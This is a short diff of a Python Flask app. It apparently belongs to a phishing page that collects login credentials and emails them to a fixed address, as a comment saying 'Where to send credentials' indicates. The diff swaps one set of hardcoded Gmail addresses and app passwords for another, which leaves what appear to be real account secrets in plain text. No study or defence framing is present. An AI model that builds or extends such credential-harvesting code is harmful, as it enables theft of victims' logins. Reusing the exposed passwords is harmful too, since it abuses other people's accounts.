@@ -5,8 +5,8 @@ from email.mime.text import MIMEText
 app = Flask(__name__)
 
 # Email configuration (replace with your details)
-EMAIL_ADDRESS = "kuldux8@gmail.com"  # Your Gmail address
-EMAIL_PASSWORD = "jspade1111"    # Gmail App Password (NOT regular password)
+EMAIL_ADDRESS = "aresjr105@gmail.com"  # Your Gmail address
+EMAIL_PASSWORD = "kopexking105"    # Gmail App Password (NOT regular password)
 RECIPIENT_EMAIL = "kuldux8@gmail.com"  # Where to send credentials (use your own email)
 
 @app.route('/')
@@ -39,3 +39,4 @@ def login():
 
 if __name__ == '__main__':
     app.run(debug=True)
+
